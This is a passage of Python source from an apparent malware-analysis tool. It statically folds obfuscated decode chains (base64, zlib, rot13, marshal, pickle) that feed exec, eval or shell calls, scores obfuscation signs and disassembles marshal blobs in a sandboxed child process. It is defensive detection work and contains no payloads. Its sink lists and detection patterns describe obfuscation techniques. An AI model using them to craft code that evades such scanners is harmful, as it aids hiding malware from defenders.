_CODEC_MAP = {"rot13": "rot13", "rot_13": "rot13", "hex": "hex", "hex_codec": "hex", "base64": "b64",
              "base64_codec": "b64", "zlib": "zlib", "zlib_codec": "zlib", "bz2": "bz2", "utf-8": "utf8",
              "utf8": "utf8", "latin-1": "latin1", "utf-16": "utf16le"}


class PyFolder:
    """Bounded constant folder over a Python AST. Whitelisted calls only; dispatch is by explicit table."""

    def __init__(self, tree: ast.AST) -> None:
        self.tree = tree
        self.env: dict[str, Any] = {}
        self.unstable: set[str] = set()
        self.budget = FOLD_BUDGET
        self.depth = 0
        self.lam_depth = 0
        self.notes: list[str] = []

    # --- environment
    def build_env(self) -> None:
        body = getattr(self.tree, "body", [])
        for st in body:
            if isinstance(st, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                self.unstable.add(st.name)
        simple = (ast.Assign, ast.AugAssign, ast.Import, ast.ImportFrom, ast.Expr)
        for st in body:
            if isinstance(st, simple):
                for sub in ast.walk(st):
                    if isinstance(sub, ast.NamedExpr) and isinstance(sub.target, ast.Name):
                        self.unstable.add(sub.target.id)
            else:
                for sub in ast.walk(st):
                    if isinstance(sub, ast.Name) and isinstance(sub.ctx, (ast.Store, ast.Del)):
                        self.unstable.add(sub.id)
                    elif isinstance(sub, ast.arg):
                        self.unstable.add(sub.arg)
        # names assigned inside functions (even if also at top level) are unstable
        for st in body:
            if isinstance(st, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                for sub in ast.walk(st):
                    if isinstance(sub, ast.Name) and isinstance(sub.ctx, ast.Store):
                        self.unstable.add(sub.id)
        for st in body:
            try:
                self._bind(st)
            except RecursionError:
                continue

    def _bind(self, st: ast.stmt) -> None:
        if isinstance(st, ast.Import):
            for a in st.names:
                if a.asname:
                    self.env[a.asname] = ModuleRef(a.name)
                else:
                    self.env[a.name.split(".")[0]] = ModuleRef(a.name.split(".")[0])
        elif isinstance(st, ast.ImportFrom) and st.module and not st.level:
            for a in st.names:
                nm = a.asname or a.name
                if a.name == "*":
                    for k in list(_B64_FUNCS) + list(_ENC_FUNCS):
                        if k.startswith(st.module + "."):
                            self.env[k.split(".", 1)[1]] = FuncRef(k)
                else:
                    self.env[nm] = self._attr_of(ModuleRef(st.module), a.name)
        elif isinstance(st, ast.Assign) and len(st.targets) == 1:
            t = st.targets[0]
            if isinstance(t, ast.Name):
                if t.id not in self.unstable:
                    v = self.fold(st.value)
                    if v is not UNKNOWN:
                        self.env[t.id] = v
            elif isinstance(t, (ast.Tuple, ast.List)) and isinstance(st.value, (ast.Tuple, ast.List)) \
                    and len(t.elts) == len(st.value.elts):
                for te, ve in zip(t.elts, st.value.elts):
                    if isinstance(te, ast.Name) and te.id not in self.unstable:
                        v = self.fold(ve)
                        if v is not UNKNOWN:
                            self.env[te.id] = v
        elif isinstance(st, ast.AugAssign) and isinstance(st.target, ast.Name):
            nm = st.target.id
            if nm in self.env and nm not in self.unstable:
                v = self.fold(ast.BinOp(left=ast.Name(id=nm, ctx=ast.Load()), op=st.op, right=st.value))
                if v is UNKNOWN:
                    self.env.pop(nm, None)
                else:
                    self.env[nm] = v

    # --- helpers
    def _attr_of(self, base: Any, attr: str) -> Any:
        if isinstance(base, ModuleRef):
            dotted = f"{base.name}.{attr}"
            if dotted in _B64_FUNCS or dotted in _ENC_FUNCS or dotted in _MISC_FUNCS:
                return FuncRef(dotted)
            if base.name == "builtins" and attr in _BUILTIN_NAMES:
                return FuncRef("builtins." + attr)
            if base.name == "sys" and attr == "modules":
                return ModVars("sys.modules")
            return ModuleRef(dotted)
        if isinstance(base, FuncRef) and base.name in ("builtins.bytes", "builtins.str", "builtins.bytearray") \
                and attr in ("fromhex", "maketrans"):
            return FuncRef(("bytes." if "bytes" in base.name or "bytearray" in base.name else "str.") + attr)
        if isinstance(base, (str, bytes)):
            return FuncRef("method:" + attr, base)
        return UNKNOWN

    def callee_name(self, node: ast.expr) -> str | None:
        """Resolve a call target to a dotted name ('builtins.exec', 'os.system', ...) or None."""
        try:
            v = self.fold(node)
        except RecursionError:
            return None
        if isinstance(v, FuncRef):
            return v.name
        if isinstance(v, ModuleRef):
            return v.name
        return None

    def fold(self, node: ast.AST) -> Any:
        self.budget -= 1
        if self.budget < 0:
            if "py folder: node budget exhausted" not in self.notes:
                self.notes.append("py folder: node budget exhausted")
            return UNKNOWN
        self.depth += 1
        try:
            if self.depth > 200:
                return UNKNOWN
            return self._fold(node)
        except (RecursionError, TransformError, ValueError, TypeError, IndexError, KeyError, OverflowError,
                UnicodeError, AttributeError, ZeroDivisionError):
            return UNKNOWN
        finally:
            self.depth -= 1

    def _fold(self, node: ast.AST) -> Any:
        if isinstance(node, ast.Constant):
            v = node.value
            return v if isinstance(v, (str, bytes, int, bool, float, type(None))) else UNKNOWN
        if isinstance(node, (ast.List, ast.Tuple)):
            items = [self.fold(e) for e in node.elts]
            if any(i is UNKNOWN for i in items) or any(isinstance(e, ast.Starred) for e in node.elts):
                return UNKNOWN
            return items if isinstance(node, ast.List) else tuple(items)
        if isinstance(node, ast.JoinedStr):
            out = ""
            for p in node.values:
                if isinstance(p, ast.Constant):
                    out += str(p.value)
                elif isinstance(p, ast.FormattedValue) and p.format_spec is None and p.conversion == -1:
                    v = self.fold(p.value)
                    if not isinstance(v, (str, int)):
                        return UNKNOWN
                    out += str(v)
                else:
                    return UNKNOWN
            return out
        if isinstance(node, ast.BinOp):
            return self._binop(node)
        if isinstance(node, ast.UnaryOp):
            v = self.fold(node.operand)
            if isinstance(node.op, ast.Not):
                return (not v) if v is not UNKNOWN else UNKNOWN
            if isinstance(v, int) and not isinstance(v, bool):
                return -v if isinstance(node.op, ast.USub) else (~v if isinstance(node.op, ast.Invert) else v)
            return UNKNOWN
        if isinstance(node, ast.Name):
            if node.id in self.unstable:
                return UNKNOWN
            if node.id in self.env:
                return self.env[node.id]
            if node.id == "__builtins__":
                return ModuleRef("builtins")
            if node.id in _BUILTIN_NAMES:
                return FuncRef("builtins." + node.id)
            return UNKNOWN
        if isinstance(node, ast.Attribute):
            base = self.fold(node.value)
            return self._attr_of(base, node.attr) if base is not UNKNOWN else UNKNOWN
        if isinstance(node, ast.Subscript):
            return self._subscript(node)
        if isinstance(node, ast.Call):
            return self._call(node)
        if isinstance(node, ast.Lambda):
            return LambdaVal(node, dict(self.env))
        if isinstance(node, (ast.ListComp, ast.GeneratorExp)):
            return self._comp(node)
        if isinstance(node, ast.IfExp):
            c = self.fold(node.test)
            if c is UNKNOWN:
                return UNKNOWN
            return self.fold(node.body if c else node.orelse)
        return UNKNOWN

    def _binop(self, node: ast.BinOp) -> Any:
        a, b = self.fold(node.left), self.fold(node.right)
        if a is UNKNOWN or b is UNKNOWN:
            return UNKNOWN
        op = node.op
        ch = _chain(a) + tuple(c for c in _chain(b) if c not in _chain(a))
        if isinstance(op, ast.Add):
            if type(a) in (str, TStr) and type(b) in (str, TStr) or type(a) in (bytes, TBytes) and type(b) in (bytes, TBytes):
                return _wrap(bytes(a) + bytes(b) if isinstance(a, bytes) else str(a) + str(b), ch)
            if isinstance(a, list) and isinstance(b, list):
                return a + b
            if isinstance(a, int) and isinstance(b, int):
                return a + b
            return UNKNOWN
        if isinstance(op, ast.Mult):
            seq, n = (a, b) if isinstance(b, int) else (b, a)
            if isinstance(seq, (str, bytes, list)) and isinstance(n, int) and not isinstance(n, bool):
                if n < 0 or len(seq) * n > MAX_STR_MULT:
                    return UNKNOWN
                return _wrap(seq * n, _chain(seq)) if isinstance(seq, (str, bytes)) else seq * n
            if isinstance(a, int) and isinstance(b, int):
                return a * b
            return UNKNOWN
        if isinstance(op, ast.Mod) and isinstance(a, str):
            if re.search(r"%[-+ #0]*(\d{4,}|\*)", a):
                return UNKNOWN
            if isinstance(b, (str, int, tuple)):
                return a % b
            return UNKNOWN
        if isinstance(a, int) and isinstance(b, int) and not isinstance(a, bool):
            if isinstance(op, ast.Sub):
                return a - b
            if isinstance(op, ast.BitXor):
                return a ^ b
            if isinstance(op, ast.BitAnd):
                return a & b
            if isinstance(op, ast.BitOr):
                return a | b
            if isinstance(op, ast.Mod) and b:
                return a % b
            if isinstance(op, ast.FloorDiv) and b:
                return a // b
            if isinstance(op, ast.LShift) and 0 <= b <= 64:
                return a << b
            if isinstance(op, ast.RShift) and 0 <= b <= 64:
                return a >> b
        return UNKNOWN

    def _subscript(self, node: ast.Subscript) -> Any:
        base = self.fold(node.value)
        if base is UNKNOWN:
            return UNKNOWN
        if isinstance(base, ModVars):
            k = self.fold(node.slice)
            if not isinstance(k, str):
                return UNKNOWN
            if base.name == "sys.modules":
                return ModuleRef(k)
            return self._attr_of(ModuleRef(base.name), k)
        sl = node.slice
        if isinstance(sl, ast.Slice):
            parts = []
            for p in (sl.lower, sl.upper, sl.step):
                if p is None:
                    parts.append(None)
                else:
                    v = self.fold(p)
                    if not isinstance(v, int):
                        return UNKNOWN
                    parts.append(v)
            if isinstance(base, (str, bytes, list, tuple)):
                out = base[slice(*parts)]
                if isinstance(base, (str, bytes)):
                    return _wrap(out, _chain(base) + (("reverse",) if parts[2] == -1 and parts[0] is None and parts[1] is None else ()))
                return out
            return UNKNOWN
        idx = self.fold(sl)
        if isinstance(idx, int) and isinstance(base, (str, bytes, list, tuple)):
            return base[idx]
        return UNKNOWN

    def _comp(self, node: ast.ListComp | ast.GeneratorExp) -> Any:
        if len(node.generators) != 1:
            return UNKNOWN
        g = node.generators[0]
        if not isinstance(g.target, ast.Name):
            return UNKNOWN
        it = self.fold(g.iter)
        if isinstance(it, range):
            pass
        elif not isinstance(it, (list, tuple, str, bytes)):
            return UNKNOWN
        if len(it) > MAX_ITER:
            return UNKNOWN
        saved = self.env.get(g.target.id, UNKNOWN)
        saved_un = g.target.id in self.unstable
        self.unstable.discard(g.target.id)
        out: list = []
        try:
            for x in it:
                self.env[g.target.id] = x
                ok = True
                for cond in g.ifs:
                    c = self.fold(cond)
                    if c is UNKNOWN:
                        return UNKNOWN
                    ok = ok and bool(c)
                if not ok:
                    continue
                v = self.fold(node.elt)
                if v is UNKNOWN:
                    return UNKNOWN
                out.append(v)
        finally:
            if saved is UNKNOWN:
                self.env.pop(g.target.id, None)
            else:
                self.env[g.target.id] = saved
            if saved_un:
                self.unstable.add(g.target.id)
        return out

    def apply_lambda(self, lv: LambdaVal, args: list) -> Any:
        params = [a.arg for a in lv.node.args.args]
        if len(params) != len(args) or len(params) > 4 or self.lam_depth >= 16 or lv.node.args.vararg:
            return UNKNOWN
        saved, saved_un = self.env, self.unstable
        self.env = {**lv.env, **dict(zip(params, args))}
        self.unstable = set(self.unstable) - set(params)
        self.lam_depth += 1
        try:
            return self.fold(lv.node.body)
        finally:
            self.lam_depth -= 1
            self.env, self.unstable = saved, saved_un

    def _call(self, node: ast.Call) -> Any:
        f = self.fold(node.func)
        if f is UNKNOWN or not isinstance(f, (FuncRef, LambdaVal)):
            return UNKNOWN
        if any(isinstance(a, ast.Starred) for a in node.args) or any(k.arg is None for k in node.keywords):
            return UNKNOWN
        args = [self.fold(a) for a in node.args]
        kwargs = {k.arg: self.fold(k.value) for k in node.keywords}
        if any(a is UNKNOWN for a in args) or any(v is UNKNOWN for v in kwargs.values()):
            return UNKNOWN
        if isinstance(f, LambdaVal):
            return self.apply_lambda(f, args)
        return self._dispatch(f, args, kwargs)

    def _dispatch(self, f: FuncRef, a: list, kw: dict) -> Any:
        n = f.name
        if n in _B64_FUNCS and a:
            t = _B64_FUNCS[n]
            return _wrap(transform(t, a[0]), _chain(a[0]) + (t,))
        if n in _ENC_FUNCS and a and isinstance(a[0], (bytes, str)):
            return _wrap(_ENC_FUNCS[n](_tb(a[0])), _chain(a[0]) + ("enc",))
        if n in ("codecs.decode", "codecs.encode") and len(a) >= 2 and isinstance(a[1], str):
            t = _CODEC_MAP.get(a[1].lower())
            if t is None or (n == "codecs.encode" and t != "rot13"):
                return UNKNOWN
            return _wrap(transform(t, a[0]), _chain(a[0]) + (t,))
        if n == "marshal.loads" and a and isinstance(a[0], (bytes, str)):
            return MarshalBlob(_tb(a[0]), _chain(a[0]))
        if n == "pickle.loads" and a and isinstance(a[0], (bytes, str)):
            return PickleBlob(_tb(a[0]), _chain(a[0]))
        if n == "io.BytesIO" and a:
            return a[0]
        if n in ("builtins.__import__", "importlib.import_module") and a and isinstance(a[0], str):
            return ModuleRef(a[0])
        if n == "builtins.getattr" and len(a) >= 2 and isinstance(a[1], str):
            return self._attr_of(a[0], a[1]) if isinstance(a[0], (ModuleRef, FuncRef, str, bytes)) else UNKNOWN
        if n == "builtins.vars" and a and isinstance(a[0], ModuleRef):
            return ModVars(a[0].name)
        if n == "builtins.chr" and a and isinstance(a[0], int) and 0 <= a[0] <= 0x10FFFF:
            return chr(a[0])
        if n == "builtins.ord" and a and isinstance(a[0], (str, bytes)) and len(a[0]) == 1:
            return ord(a[0]) if isinstance(a[0], str) else a[0][0]
        if n in ("builtins.bytes", "builtins.bytearray") and a:
            if isinstance(a[0], (list, tuple)) and all(isinstance(x, int) and 0 <= x < 256 for x in a[0]):
                return bytes(a[0])
            if isinstance(a[0], str) and len(a) > 1 and isinstance(a[1], str):
                return _wrap(a[0].encode(a[1]), _chain(a[0]))
            if isinstance(a[0], bytes):
                return a[0]
            return UNKNOWN
        if n == "builtins.str" and a:
            if isinstance(a[0], bytes) and len(a) > 1 and isinstance(a[1], str):
                return _wrap(a[0].decode(a[1], "replace"), _chain(a[0]) + ("utf8",))
            return a[0] if isinstance(a[0], str) else (str(a[0]) if isinstance(a[0], int) else UNKNOWN)
        if n == "builtins.int" and a:
            if isinstance(a[0], (str, bytes)):
                return int(a[0], a[1]) if len(a) > 1 else int(a[0])
            return int(a[0]) if isinstance(a[0], int) else UNKNOWN
        if n == "builtins.hex" and a and isinstance(a[0], int):
            return hex(a[0])
        if n in ("builtins.list", "builtins.tuple") and a and isinstance(a[0], (list, tuple, str, bytes, range)):
            seq = list(a[0])
            return seq if n.endswith("list") else tuple(seq)
        if n == "builtins.reversed" and a and isinstance(a[0], (list, tuple, str, bytes)):
            return list(reversed(a[0]))
        if n == "builtins.len" and a and isinstance(a[0], (list, tuple, str, bytes)):
            return len(a[0])
        if n == "builtins.sum" and a and isinstance(a[0], (list, tuple)) and all(isinstance(x, int) for x in a[0]):
            return sum(a[0])
        if n == "builtins.range" and a and all(isinstance(x, int) for x in a) and len(a) <= 3:
            r = range(*a)
            return r if len(r) <= MAX_ITER else UNKNOWN
        if n == "builtins.zip" and a and all(isinstance(x, (list, tuple, str, bytes)) for x in a):
            return [tuple(t) for t in zip(*a)]
        if n == "builtins.map" and len(a) == 2 and isinstance(a[1], (list, tuple, str, bytes)):
            fn = a[0]
            if len(a[1]) > MAX_ITER:
                return UNKNOWN
            res = []
            for x in a[1]:
                v = self.apply_lambda(fn, [x]) if isinstance(fn, LambdaVal) else (
                    self._dispatch(fn, [x], {}) if isinstance(fn, FuncRef) else UNKNOWN)
                if v is UNKNOWN:
                    return UNKNOWN
                res.append(v)
            return res
        if n.startswith("method:"):
            return self._method(n[7:], f.bound, a, kw)
        if n == "bytes.maketrans" and len(a) == 2 and isinstance(a[0], bytes):
            return bytes.maketrans(a[0], a[1])
        if n == "str.maketrans" and a:
            return str.maketrans(*a) if all(isinstance(x, (str, dict)) for x in a) else UNKNOWN
        return UNKNOWN

    def _method(self, m: str, obj: Any, a: list, kw: dict) -> Any:
        ch = _chain(obj)
        if m == "decode" and isinstance(obj, bytes):
            enc = a[0] if a and isinstance(a[0], str) else kw.get("encoding", "utf-8")
            return _wrap(obj.decode(enc, "replace"), ch + ("utf8",))
        if m == "encode" and isinstance(obj, str):
            enc = a[0] if a and isinstance(a[0], str) else "utf-8"
            return _wrap(obj.encode(enc), ch)
        if m == "join" and a and isinstance(a[0], (list, tuple)):
            if isinstance(obj, str) and all(isinstance(x, str) for x in a[0]):
                return _wrap(obj.join(a[0]), ())
            if isinstance(obj, bytes) and all(isinstance(x, bytes) for x in a[0]):
                return _wrap(obj.join(a[0]), ())
            return UNKNOWN
        if m == "replace" and len(a) >= 2 and type(a[0]) is type(obj) is type(a[1]) or (
                m == "replace" and len(a) >= 2 and isinstance(obj, (str, bytes)) and isinstance(a[0], type(obj)) and isinstance(a[1], type(obj))):
            return _wrap(obj.replace(a[0], a[1]), ch)
        if m in ("strip", "lstrip", "rstrip") and isinstance(obj, (str, bytes)):
            return _wrap(getattr(obj, m)(*[x for x in a if isinstance(x, type(obj))]), ch)
        if m in ("lower", "upper") and isinstance(obj, (str, bytes)):
            return _wrap(getattr(obj, m)(), ch)
        if m == "split" and isinstance(obj, (str, bytes)):
            return list(obj.split(*[x for x in a[:1] if isinstance(x, type(obj))]))
        if m == "translate" and a and isinstance(obj, (str, bytes)):
            if isinstance(obj, str) and isinstance(a[0], dict):
                return _wrap(obj.translate(a[0]), ch)
            if isinstance(obj, bytes) and isinstance(a[0], bytes) and len(a[0]) == 256:
                return _wrap(obj.translate(a[0]), ch)
        return UNKNOWN


_MISC_FUNCS = {"marshal.loads", "pickle.loads", "pickle.load", "codecs.decode", "codecs.encode", "io.BytesIO",
               "importlib.import_module", "os.system", "os.popen", "subprocess.run", "subprocess.call",
               "subprocess.check_output", "subprocess.Popen", "subprocess.getoutput", "types.FunctionType"}


# ---------- Python: obfuscation measures + sinks
_RENAME_PATS = [re.compile(p) for p in (r"^_+$", r"^[Il1O0_]{4,}$", r"^_0x[0-9a-fA-F]{3,}$", r"^(?:_{1,2}[a-zA-Z]?){1,3}\d*$")]


def _rename_like(n: str) -> bool:
    if any(p.match(n) for p in _RENAME_PATS):
        return True
    if re.match(r"^[a-zA-Z_]\w{9,}$", n):
        letters = [c for c in n.lower() if c.isalpha()]
        if letters and sum(c in "aeiou" for c in letters) / len(letters) < 0.15:
            return True
    return False


def _rename_density(names: set[str]) -> float:
    return sum(_rename_like(n) for n in names) / len(names) if len(names) >= 8 else 0.0


def _measure_text(layer: Layer, report: Report, idents: set[str]) -> None:
    """Obfuscation measures common to all languages (tells only)."""
    text = layer.text or ""
    d = _rename_density(idents)
    layer.meta["rename_density"] = round(d, 2)
    if d >= 0.40:
        _add_tell(report, "T-RENAME-DENSITY", f"{layer.id}:1", "identifier renaming", f"{d:.0%} of identifiers look machine-generated", "medium", "medium")
    elif d >= 0.20:
        _add_tell(report, "T-RENAME-DENSITY", f"{layer.id}:1", "identifier renaming", f"{d:.0%} of identifiers look machine-generated", "low", "low")
    lits = re.findall(r"""(['"])((?:\\.|(?!\1).)*)\1""", text[:IOC_SCAN_CAP])
    tot = sum(len(x[1]) for x in lits)
    esc = sum(len(re.findall(r"\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}|\\[0-7]{3}", x[1])) * 4 for x in lits)
    if tot >= 40 and esc / max(1, tot) >= 0.25:
        _add_tell(report, "T-ESCAPE-DENSITY", f"{layer.id}:1", "escape-heavy string literals", f"{esc / tot:.0%} of literal chars are escapes", "low", "low")
    big = [x for x in lits if len(x[1]) >= 1024]
    if big:
        pos = text.find(big[0][1][:40])
        _add_tell(report, "T-LONG-LITERAL", f"{layer.id}:{_line_of(text, max(0, pos))}", "very long string literal", f"{len(big[0][1])} chars", "high", "info")
    best = 0
    for m in re.finditer(r"""(?:(?:'[^'\n]*'|"[^"\n]*")\s*\+\s*){3,}(?:'[^'\n]*'|"[^"\n]*")""", text[:IOC_SCAN_CAP]):
        best = max(best, len(re.findall(r"""['"]\s*\+\s*['"]""", m.group())) + 1)
    layer.meta["concat"] = best
    if best >= 12:
        _add_tell(report, "T-CONCAT-SPLIT", f"{layer.id}:1", "string concatenation splitting", f"{best} pieces joined", "medium", "medium")
    elif best >= 4:
        _add_tell(report, "T-CONCAT-SPLIT", f"{layer.id}:1", "string concatenation splitting", f"{best} pieces joined", "medium", "low")


def _py_sink_value(folder: PyFolder, call: ast.Call, name: str) -> tuple[Any, ast.expr | None]:
    """Return (folded value, argument node) for a sink call."""
    if not call.args:
        return UNKNOWN, None
    arg = call.args[0]
    if name in ("builtins.exec", "builtins.eval") and isinstance(arg, ast.Call) \
            and folder.callee_name(arg.func) == "builtins.compile" and arg.args:
        arg = arg.args[0]
    return folder.fold(arg), arg


def _py_regex_fallback(layer: Layer, report: Report) -> list[Unwrap]:
    text = layer.text or ""
    out: list[Unwrap] = []
    names = {"b64decode": "b64", "decompress": "zlib", "unhexlify": "hex", "a2b_hex": "hex", "decodebytes": "b64",
             "b32decode": "b32", "b85decode": "b85", "fromhex": "hex"}
    for m in re.finditer(r"""exec\s*\(?\s*((?:[\w.]+\(\s*)+)[bBuU]?(['"])([^'"\n]+)\2""", text):
        fns = [x.split(".")[-1].rstrip("(").strip() for x in re.findall(r"[\w.]+\(", m.group(1))]
        data: Any = m.group(3)
        chain: list[str] = []
        try:
            for fn in reversed(fns):
                t = names.get(fn)
                if t is None:
                    raise TransformError(fn)
                data = transform(t, data)
                chain.append(t)
        except TransformError:
            continue
        if isinstance(data, bytes) and chain:
            out.append(Unwrap(data, "py", " -> ".join(chain), "exec", f"{layer.id}:{_line_of(text, m.start())}", "medium"))
    for m in re.finditer(r"""exec\s*\(\s*codecs\.decode\(\s*(['"])(.+?)\1\s*,\s*['"]rot_?13['"]""", text):
        out.append(Unwrap(_t_rot13(m.group(2)).encode(), "py", "rot13", "exec", f"{layer.id}:{_line_of(text, m.start())}", "medium"))
    for m in re.finditer(r"""^\s*exec\s+(['"])(.+?)\1\s*$""", text, re.M):
        out.append(Unwrap(m.group(2).encode(), "py", "literal", "exec", f"{layer.id}:{_line_of(text, m.start())}", "medium"))
    return out


_SH_SINKS = {"os.system", "os.popen", "subprocess.run", "subprocess.call", "subprocess.check_output",
             "subprocess.Popen", "subprocess.getoutput"}


def _looks_like_code(b: bytes) -> bool:
    if b[:4] == b"\x7fELF" or b[:2] == b"MZ" or b[:2] == b"\x1f\x8b":
        return True
    if len(b) < 64 or decode.printable_ratio(b) < 0.8:
        return False
    t = b.decode("utf-8", "replace")
    return _detect_lang(t)[1] in ("medium", "high") or decode.printable_ratio(b) >= 0.8


def _py_detect(layer: Layer, report: Report, opts: Options) -> list[Unwrap]:
    text = layer.text or ""
    try:
        tree = ast.parse(text)
    except (SyntaxError, ValueError, RecursionError, MemoryError) as exc:
        report.notes.append(f"{layer.id}: py: AST parse failed ({str(exc)[:60]}); regex fallback")
        res = _py_regex_fallback(layer, report)
        for u in res:
            _add_tell(report, "T-DECODE-EXEC", u.src_loc, "decode chain feeds exec", u.kind)
        return res
    folder = PyFolder(tree)
    folder.build_env()
    out: list[Unwrap] = []
    covered: set[int] = set()
    done_compile: set[int] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign) and isinstance(node.value, ast.Lambda) and any(
                (isinstance(n, ast.Name) and n.id == "__import__") or
                (isinstance(n, ast.Attribute) and re.search(r"decompress|b64decode|unhexlify|decode|loads", n.attr))
                for n in ast.walk(node.value)):
            _add_tell(report, "T-LAMBDA-WRAPPER", f"{layer.id}:{node.lineno}", "lambda-wrapped decoder", _snip(ast.get_source_segment(text, node) or "", 100), "medium")
        if not isinstance(node, ast.Call) or id(node) in done_compile:
            continue
        name = folder.callee_name(node.func)
        loc = f"{layer.id}:{node.lineno}"
        if name is None:
            continue
        if name in ("builtins.exec", "builtins.eval", "builtins.compile", "types.FunctionType", "pickle.loads", "pickle.load") \
                or name in _SH_SINKS:
            if name == "builtins.compile" and id(node) in done_compile:
                continue
            via = {"builtins.exec": "exec", "builtins.eval": "eval", "builtins.compile": "compile",
                   "types.FunctionType": "marshal", "pickle.loads": "pickle", "pickle.load": "pickle"}.get(name, "shell")
            if name in _SH_SINKS and node.args and isinstance(node.args[0], (ast.List, ast.Tuple)):
                els = node.args[0].elts
                if len(els) >= 3:
                    cmd_nodes = [folder.fold(e) for e in els[:2]]
                    if cmd_nodes[0] in ("sh", "bash", "/bin/sh", "/bin/bash") and cmd_nodes[1] == "-c":
                        val: Any = folder.fold(els[2])
                        arg: ast.expr | None = els[2]
                    else:
                        continue
                else:
                    continue
            else:
                val, arg = _py_sink_value(folder, node, name)
            if arg is not None:
                for sub in ast.walk(arg):
                    covered.add(id(sub))
                if isinstance(arg, ast.Call) and name == "builtins.exec":
                    pass
            if name == "builtins.exec" and node.args and isinstance(node.args[0], ast.Call) \
                    and folder.callee_name(node.args[0].func) == "builtins.compile":
                done_compile.add(id(node.args[0]))
            if arg is None:
                continue
            if name in ("builtins.exec", "builtins.eval", "builtins.compile") and val is UNKNOWN:
                if not isinstance(arg, ast.Constant):
                    _add_tell(report, "T-DYN-EXEC", loc, "dynamic code with unresolved argument", _snip(ast.get_source_segment(text, node) or "", 100), "medium")
                continue
            if isinstance(val, MarshalBlob):
                ch = " -> ".join(val.chain) or "literal"
                _add_tell(report, "T-MARSHAL", loc, "marshal-loaded code object executed", ch)
                out.append(Unwrap(val.data, "pyc", ch, "marshal", loc))
                continue
            if isinstance(val, PickleBlob):
                out.append(Unwrap(val.data, "blob", " -> ".join(val.chain) or "literal", "pickle", loc))
                continue
            if isinstance(val, (str, bytes)):
                ch = _chain(val)
                if name in _SH_SINKS and not ch and len(val) < 200:
                    continue
                data = val.encode("utf-8", "replace") if isinstance(val, str) else bytes(val)
                lang = "sh" if name in _SH_SINKS else "py"
                kind = " -> ".join(ch) or "literal"
                if ch and lang == "py":
                    _add_tell(report, "T-DECODE-EXEC", loc, "decode chain feeds " + via, f"{kind} -> {via}: {_snip(ast.get_source_segment(text, node) or '', 80)}")
                elif ch:
                    _add_tell(report, "T-DECODE-EXEC", loc, "decode chain feeds shell command", kind)
                out.append(Unwrap(data, lang, kind, via, loc))
        elif name in ("builtins.__import__", "importlib.import_module"):
            if node.args and not isinstance(node.args[0], ast.Constant):
                _add_tell(report, "T-IMPORT-DYNAMIC", loc, "dynamic import", _snip(ast.get_source_segment(text, node) or "", 80), "medium")
        elif name == "builtins.getattr" and len(node.args) >= 2 and not isinstance(node.args[1], ast.Constant):
            r = folder.fold(node.args[1])
            _add_tell(report, "T-GETATTR-STRING", loc, "attribute resolved from computed string", f"resolves to {r!r}" if isinstance(r, str) else "unresolved", "medium")
    # embedded decoded literals not consumed by a sink
    skip: set[int] = set(covered)

    def walk(n: ast.AST) -> None:
        if id(n) in skip:
            return
        if isinstance(n, ast.Call):
            v = folder.fold(n)
            if isinstance(v, (str, bytes)) and _chain(v) and len(v) >= 64:
                b = bytes(v) if isinstance(v, bytes) else v.encode("utf-8", "replace")
                if _looks_like_code(b):
                    out.append(Unwrap(b, None, " -> ".join(_chain(v)), "embedded", f"{layer.id}:{n.lineno}", "medium"))
                    return
            elif isinstance(v, (str, bytes)) and _chain(v):
                s = v.decode("utf-8", "replace") if isinstance(v, bytes) else v
                layer.meta.setdefault("decoded_literals", []).append((n.lineno, s))
        for c in ast.iter_child_nodes(n):
            walk(c)

    try:
        walk(tree)
    except RecursionError:
        report.notes.append(f"{layer.id}: py: embedded-literal walk hit recursion limit")
    report.notes.extend(n for n in folder.notes if n not in report.notes)
    layer.meta["_folder"] = folder
    return out


# ---------- marshal helper (isolated child)
_MARSHAL_HELPER = r'''
import sys, marshal, dis, json, types, base64, io
blob = sys.stdin.buffer.read()
if len(blob) >= 16 and blob[2:4] == b"\r\n":
    blob = blob[16:]
count = [0]
def walk(co):
    count[0] += 1
    if count[0] > 2000:
        return None
    try:
        text = dis.Bytecode(co).dis().splitlines()[:400]
    except Exception as e:
        text = ["<dis failed: %s>" % e]
    kids = []
    for c in co.co_consts:
        if isinstance(c, types.CodeType):
            k = walk(c)
            if k is not None:
                kids.append(k)
    return {"name": co.co_name, "qualname": getattr(co, "co_qualname", co.co_name), "filename": co.co_filename,
            "firstlineno": co.co_firstlineno, "argcount": co.co_argcount, "names": list(co.co_names),
            "varnames": list(co.co_varnames),
            "consts_str": [c for c in co.co_consts if isinstance(c, str)][:500],
            "consts_bytes_b64": [base64.b64encode(c).decode() for c in co.co_consts if isinstance(c, bytes)][:100],
            "consts_int": [c for c in co.co_consts if isinstance(c, int) and not isinstance(c, bool)][:500],
            "dis": "\n".join(text), "children": kids}
obj = marshal.loads(blob)
if isinstance(obj, types.CodeType):
    res = walk(obj)
else:
    res = {"object_type": type(obj).__name__, "repr": repr(obj)[:4096]}
out = json.dumps(res)
sys.stdout.write(out[: 4 << 20])
'''


def _limit_child() -> None:  # pragma: no cover - runs in the child before exec
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_AS, (1 << 30, 1 << 30))
        resource.setrlimit(resource.RLIMIT_CPU, (10, 10))
    except (ImportError, ValueError, OSError):
        pass


def _run_marshal_helper(blob: bytes) -> tuple[dict | None, str]:
    try:
        p = subprocess.run([sys.executable, "-I", "-S", "-E", "-c", _MARSHAL_HELPER], input=blob,
                           capture_output=True, timeout=HELPER_TIMEOUT,
                           preexec_fn=_limit_child if os.name == "posix" else None)
    except (subprocess.TimeoutExpired, OSError, ValueError) as exc:
        return None, type(exc).__name__
    if p.returncode != 0:
        return None, f"exit {p.returncode}: {p.stderr.decode('utf-8', 'replace')[-120:].strip()}"
    try:
        return json.loads(p.stdout.decode("utf-8", "replace")), ""
    except ValueError:
        return None, "bad JSON"


def _walk_code(d: dict) -> list[dict]:
    out = [d]
    for c in d.get("children", []):
        out.extend(_walk_code(c))
    return out


def _pyc_prepare(layer: Layer, report: Report) -> None:
    """Fill ``layer.meta['marshal']`` (helper JSON) or fall back to a raw string scan."""
    blob = layer.data
    ver_ok = True
    if _pyc_magic_ok(blob):
        n = int.from_bytes(blob[:2], "little")
        ver = _pyc_version(n)
        layer.meta["pyc_version"] = ver
        cur = importlib.util.MAGIC_NUMBER
        if blob[:4] != cur:
            ver_ok = False
